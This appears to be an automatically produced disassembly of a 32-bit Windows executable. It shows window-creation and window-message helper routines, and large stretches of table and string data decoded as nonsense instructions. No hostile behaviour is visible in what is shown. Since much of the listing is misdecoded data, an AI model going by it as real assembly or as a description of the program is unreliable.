xchg edx eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg edx eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x1c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x1c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx - 0x3da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x7da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0xbda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0xfda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x1fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x4bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg esi eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg esi eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x2c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x2825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x1c25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg esi eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg esi eax
inc esi
add [ ebx - 0x3da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x7da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0xbda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0xfda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x1fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x4bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x2c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x2825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x2025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x1c25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg ebp eax
inc esi
add [ ebx - 0x3da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x7da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0xbda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0xfda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x1fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x4bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg esp eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg esp eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x6025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x5c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x5825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x5425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x5025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x4c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x4825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x4425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x4025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x3c25ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x3825ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x3425ffc0 ] cl
xchg esp eax
inc esi
add [ ebx + 0x3025ffc0 ] cl
xchg esp eax
inc esi
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x2825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x2425ffc0 ] cl
xchg ebx eax
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
or al 0x5e
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x1c25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x1825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x1425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg ebx eax
mov eax eax
add ebx [ eax + 0x5d ]
inc eax
add [ ebx + 0x1025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x2c25ffc0 ] cl
xchg ebx eax
inc esi
sub_4067fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402918
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402908
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406854
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402918
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402908
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_4068ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4069a1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4069c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4069d0
retn
sub_4069dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406a01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406a08
retn
sub_406a14
xchg [ fs : esi ] al
[ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax + 0x640000ff ] dh
xchg [ esi ] al
mov cl 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov dl 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov bl 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov ah 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov ch 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov dh 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov bh 0xff
add [ eax ] al
xchg [ fs : esi ] al
mov eax 0x640000ff
xchg [ esi ] al
mov ecx 0x640000ff
xchg [ esi ] al
mov edx 0x640000ff
xchg [ esi ] al
mov ebx 0x640000ff
xchg [ esi ] al
mov esp 0x640000ff
xchg [ esi ] al
mov ebp 0x640000ff
xchg [ esi ] al
mov esi 0x640000ff
xchg [ esi ] al
mov edi 0x640000ff
xchg [ esi ] al
mov al [ 0x640000ff ]
xchg [ esi ] al
mov eax [ 0x640000ff ]
xchg [ esi ] al
mov [ 0x640000ff ] al
xchg [ esi ] al
mov [ 0x640000ff ] eax
xchg [ esi ] al
movsb [ edi ] [ esi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp + 0x640000ff ] ah
xchg [ esi ] al
cmpsb [ esi ] [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + 0x640000ff ] ah
xchg [ esi ] al
test al 0xff
add [ eax ] al
xchg [ fs : esi ] al
test eax 0x640000ff
xchg [ esi ] al
stosb [ edi ]
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406d11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d18
retn
sub_406d38
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebp + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
insd
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
